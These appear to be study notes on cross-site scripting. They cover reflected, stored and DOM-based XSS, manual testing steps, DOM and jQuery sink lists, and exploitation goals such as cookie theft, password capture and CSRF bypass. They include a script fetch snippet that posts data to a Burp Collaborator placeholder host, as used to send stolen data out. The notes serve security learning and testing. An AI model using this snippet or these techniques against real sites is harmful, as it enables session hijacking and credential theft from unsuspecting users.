Cross-site scripting (XSS) is a web security vulnerability that allows an attacker to inject malicious JavaScript code into a website, causing it to execute in another user's browser.

### XSS types:

- **Reflected cross-site scripting (Reflected XSS)** occurs when user-controlled input is reflected in a website's response without proper sanitization, causing malicious JavaScript to execute in the victim's browser. The attack is usually delivered through a specially crafted malicious link that the victim is tricked into opening. The attacker may then be able to perform actions with the same privileges as the victim user.
  **Manual testing:**
	  - **Test every entry point.** - check all locations where user-controlled input can be supplied, such as URL parameters, request bodies, paths, and headers.
	  - **Submit random alphanumeric values** - send a unique random value and check whether it appears in the response.
	  - **Determine the reflection context** - identify where the input is reflected, for example in HTML, an attribute, or JavaScript.
	  - **Test a candidate payload** - try a simple payload appropriate for the identified context.
	  - **Test alternative payloads** - if the input is filtered or modified, try other suitable variations.
	  - **Test the attack in a browser** - confirm whether the JavaScript actually executes in the browser.

- **Stored cross-site scripting** -  occurs when an application receives data from an untrusted source and includes that data within its later HTTP responses in an unsafe way.
  **Manual testing:**
	- **Identify entry points** - find where attacker-controlled data can enter the application.
	- **Submit a unique test value** - use a random value to track where the data appears later.
	- **Identify exit points** - check later responses and pages where the stored value is displayed.
	- **Confirm the data is stored** - verify that the value persists across different requests.
	- **Determine the output context** - identify whether the value appears in HTML, an attribute, JavaScript, etc.
	- **Test a suitable payload** - try an XSS payload appropriate for that context.
	- **Verify in a browser** - confirm that the JavaScript executes when the stored data is viewed.

- **DOM-based XSS** - happens when JavaScript takes data controlled by the user, for example from the URL, and puts it into an unsafe place such as `innerHTML` or `eval()`.
  **Manual testing:**
- Check each possible source one by one and test it in the browser’s Developer Tools.
**Testing HTML sinks:**
- Inject a unique string into a source.
- Find it in the DOM using DevTools.
-  Check its context and try to break out of it.
-  Remember that URL-encoding can prevent XSS.
**Testing JavaScript execution sinks:**
- Find where the source is used in JavaScript.
- Set breakpoints in DevTools.
- Trace the input through variables.
- Check if it reaches a dangerous sink like `eval()`.
- Inspect the value before it enters the sink.

### reflected XSS vs stored XSS
- **Reflected XSS** - victim clicks malicious link.
- **Stored XSS** - victim visits a page containing previously stored malicious input.
- **Self-XSS** - victim must manually paste/submit the malicious input themselves.

### Ways to Exploit cross-site scripting
- **Steal cookies** - stealing cookies by sending victim cookies to your own domain
- **capture passwords** - create a password input, reading out the auto-filled password, and send it to your own domain
- **bypass CSRF protections** - use XSS to read the victim's CSRF token from the page and then send a valid request using that token



### Cross-site scripting (XSS) cheat sheet:
https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

**javaScript fetch:**
<script> 
fetch('https://BURP-COLLABORATOR-SUBDOMAIN', { 
method: 'POST', 
mode: 'no-cors', 
body: <body>
}); 
</script>


**main sinks that can lead to DOM-XSS vulnerabilities:**
*document.write()* 
*document.writeln()* 
*document.domain* 
*element.innerHTML* - does not accept onload or `<script>` instead use `<img src=1 onerror=...>`
*element.outerHTML* 
*element.insertAdjacentHTML* 
*element.onevent*

**JQuery sinks that can lead to DOM-XSS vulnerabilities:**
*add()* 
*after()* 
*append()* 
*animate()*
*insertAfter()* 
*insertBefore()* 
*before()* 
*html()* 
*prepend()* 
*replaceAll()* 
*replaceWith()* 
*wrap()* 
*wrapInner()* 
*wrapAll()* 
*has()* 
*constructor()* 
*init()* 
*index()* 
*jQuery.parseHTML()* 
*$.parseHTML()*